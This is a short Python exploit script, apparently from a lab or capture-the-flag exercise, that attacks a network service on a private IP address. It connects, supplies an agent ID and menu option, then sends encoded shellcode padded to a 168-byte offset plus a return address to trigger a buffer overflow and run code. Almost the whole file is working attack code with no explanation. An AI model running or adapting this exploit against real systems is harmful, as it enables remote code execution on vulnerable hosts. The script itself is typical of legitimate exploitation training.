import socket

# Target related variables
remotehost = "10.42.0.147"
remoteport = 7788
menuoption = 3
agentid = 48093572

# Default recv size
recvsize = 512

# Connnect to remote host
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((remotehost, remoteport))
client.recv(recvsize)
client.send("{0}\n".format(agentid))
client.recv(recvsize)
client.send("{0}\n".format(menuoption))
client.recv(recvsize)

# Connnect to remote host
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((remotehost, remoteport))
client.recv(recvsize)
client.send("{0}\n".format(agentid))
client.recv(recvsize)
client.send("{0}\n".format(menuoption))
client.recv(recvsize)

buf =  b""
buf += b"\xbb\xe0\x5b\xb1\x32\xda\xd4\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x12\x83\xea\xfc\x31\x5a\x0e\x03\xba\x55\x53"
buf += b"\xc7\x0b\xb1\x64\xcb\x38\x06\xd8\x66\xbc\x01\x3f\xc6"
buf += b"\xa6\xdc\x40\xb4\x7f\x6f\x7f\x76\xff\xc6\xf9\x71\x97"
buf += b"\xd2\xd3\x81\x33\x8b\x21\x82\xa5\x27\xaf\x63\x69\xd1"
buf += b"\xff\x32\xda\xad\x03\x3c\x3d\x1c\x83\x6c\xd5\xf1\xab"
buf += b"\xe3\x4d\x66\x9b\x2c\xef\x1f\x6a\xd1\xbd\x8c\xe5\xf7"
buf += b"\xf1\x38\x3b\x77"

# Buffer is too small to trigger overflow. Fattening it up!
# 168 is the offset I found using pattern_offset
buf += "A" * (168 - len(buf))

# EAX call I made note of earlier in this segment
buf += "\x63\x85\x04\x08\n"

# And off we go!
client.send(buf)
